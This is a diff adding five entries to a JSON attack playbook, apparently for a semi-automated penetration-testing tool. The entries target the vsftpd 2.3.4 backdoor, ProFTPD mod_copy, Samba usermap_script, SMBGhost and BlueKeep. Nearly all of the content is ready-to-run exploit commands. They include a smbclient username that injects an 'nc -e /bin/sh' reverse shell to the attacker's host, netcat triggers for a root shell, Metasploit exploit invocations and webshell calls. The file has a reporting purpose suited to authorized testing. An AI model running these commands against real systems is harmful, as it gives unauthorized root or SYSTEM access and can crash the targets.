@@ -961,6 +961,248 @@
           "note": "Let nmap run the whole bounce scan: -b is the FTP relay, the trailing host is the internal target."
         }
       ]
+    },
+    {
+      "id": "vsftpd-backdoor",
+      "title": "vsftpd 2.3.4 Backdoor (CVE-2011-2523)",
+      "hypothesis": "One backdoored release of vsftpd, version 2.3.4, opens a root shell on port 6200 when any username ends in a smiley. Confirm the banner reads vsftpd 2.3.4, send a login whose username ends in ':)', then connect to tcp/6200 for a root shell. Because the trigger is a banner version, not a configuration, this is a reliable instant root when you see it.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "ftp",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:21"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a root shell on tcp/6200 when the banner is vsftpd 2.3.4",
+      "does_not_prove": "anything on any other vsftpd version; only 2.3.4 carries the backdoor",
+      "report": {
+        "finding": "Backdoored vsftpd 2.3.4 grants an unauthenticated root shell",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2011-2523"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p21 -sV {{target}}",
+          "note": "Fingerprint first: the backdoor exists only when the banner reads vsftpd 2.3.4."
+        },
+        {
+          "tool": "nc",
+          "run": "(printf 'USER hax:)\\r\\nPASS hax\\r\\n'; sleep 2) | nc {{target}} 21; nc {{target}} 6200",
+          "note": "A username ending in ':)' trips the backdoor; the second connection to 6200 is your root shell. Type id to confirm."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {{target}}; run\"",
+          "note": "The Metasploit module automates the trigger and the 6200 connect."
+        }
+      ]
+    },
+    {
+      "id": "proftpd-modcopy",
+      "title": "ProFTPD mod_copy Unauthenticated Copy to Webshell (CVE-2015-3306)",
+      "hypothesis": "ProFTPD 1.3.5 exposes SITE CPFR and SITE CPTO with no authentication, so you can copy a file the server can read into a directory the web server serves. Point it at a PHP payload and you have written a webshell into the web root without a single credential. You need to know the web root path, which recon of the HTTP service usually reveals.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "curl",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:21"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "an attacker-written file executing under the web root via unauthenticated SITE CPFR/CPTO",
+      "does_not_prove": "code execution unless the copy target is actually served and executed by the web server",
+      "report": {
+        "finding": "ProFTPD 1.3.5 mod_copy allows unauthenticated file copy into the web root",
+        "severity": "high"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2015-3306"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p21 -sV {{target}}",
+          "note": "Confirm the banner reads ProFTPD 1.3.5 before you try the copy."
+        },
+        {
+          "tool": "nc",
+          "run": "nc {{target}} 21",
+          "note": "Then paste: SITE CPFR /etc/passwd then SITE CPTO /tmp/out to prove the copy works before you write a payload."
+        },
+        {
+          "tool": "curl",
+          "run": "curl 'http://{{target}}/shell.php?cmd=id'",
+          "note": "After copying a PHP payload into the web root, call it. Swap id for a reverse-shell one-liner once it responds. Start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "samba-usermap",
+      "title": "Samba usermap_script Command Injection (CVE-2007-2447)",
+      "hypothesis": "Old Samba, versions 3.0.20 through 3.0.25rc3, passes the username straight into a shell when the username map script option is set, so a username that contains a shell command runs that command as root. You inject through the username field of an anonymous IPC connection, with a listener waiting, and catch a root shell. No credentials and no file upload are needed.",
+      "tool": "smbclient",
+      "tools": [
+        "smbclient",
+        "nmap"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "port:445",
+        "port:139"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 42,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as root via the Samba username map on 3.0.20 to 3.0.25rc3",
+      "does_not_prove": "anything on a patched Samba or when the username map script option is unset",
+      "report": {
+        "finding": "Samba usermap_script command injection grants an unauthenticated root shell",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2007-2447"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p139,445 --script smb-os-discovery {{target}}",
+          "note": "Confirm the version sits between Samba 3.0.20 and 3.0.25rc3."
+        },
+        {
+          "tool": "smbclient",
+          "run": "smbclient //{{target}}/ipc$ -N -U \"./=`nohup nc {{lhost}} 4444 -e /bin/sh`\"",
+          "note": "The username carries the command; start nc -lvnp 4444 first to catch the root shell."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
+          "note": "The Metasploit module is the reliable alternative if the manual injection is awkward."
+        }
+      ]
+    },
+    {
+      "id": "smbghost",
+      "title": "SMBGhost SMBv3 Compression Overflow (CVE-2020-0796)",
+      "hypothesis": "SMBv3.1.1 on Windows 10 1903 and 1909 and Server 2019 mishandles compressed messages, which a crafted packet turns into local or remote code execution as SYSTEM. First confirm the host speaks SMB 3.1.1 with compression, then run the public proof of concept. The remote exploit is unstable and can crash the target, so snapshot the box and prefer it where a crash is acceptable.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "python"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "port:445"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.system"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM on a vulnerable SMBv3.1.1 host when the proof of concept lands",
+      "does_not_prove": "anything unless the host is the exact vulnerable build, and the RCE path can crash it",
+      "report": {
+        "finding": "SMBGhost SMBv3.1.1 compression overflow allows code execution as SYSTEM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-0796"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p445 --script smb-protocols {{target}}",
+          "note": "You need SMB 3.1.1; the build must be Win10 1903/1909 or Server 2019 for the compression bug."
+        },
+        {
+          "tool": "python",
+          "run": "python3 scanner.py {{target}}",
+          "note": "The ollypwn SMBGhost scanner prints Vulnerable or Not vulnerable before you risk the exploit."
+        },
+        {
+          "tool": "python",
+          "run": "python3 SMBGhost_RCE.py -ip {{target}}",
+          "note": "chompie1337's RCE proof of concept; edit the embedded shellcode to call back to {{lhost}}. It can BSOD the host, so snapshot first."
+        }
+      ]
+    },
+    {
+      "id": "bluekeep",
+      "title": "BlueKeep RDP Pre-Auth RCE (CVE-2019-0708)",
+      "hypothesis": "RDP on Windows 7 and Server 2008 R2 has a pre-authentication use-after-free that reaches code execution as SYSTEM with no credentials. Confirm the host is vulnerable with the nmap script, pick the exact target profile the exploit asks for, then run it. The proof of concept is crash-prone, so treat a BSOD as a likely outcome and only fire it where that is acceptable.",
+      "tool": "nmap",
+      "tools": [
+        "nmap",
+        "msfconsole"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "port:3389"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.system"
+      ],
+      "priority": 38,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM on a vulnerable Win7 or Server 2008 R2 RDP host",
+      "does_not_prove": "anything on a patched or non-matching target, and the exploit can crash the host",
+      "report": {
+        "finding": "BlueKeep pre-auth RDP RCE allows code execution as SYSTEM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+          "note": "Confirm VULNERABLE before you go further; the exploit is unsafe to fire blindly."
+        },
+        {
+          "tool": "msfconsole",
+          "run": "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {{target}}; set LHOST {{lhost}}; run\"",
+          "note": "Set the correct target arch and VM profile; the wrong one BSODs the host instead of landing a shell."
+        }
+      ]
     }
   ]
 }
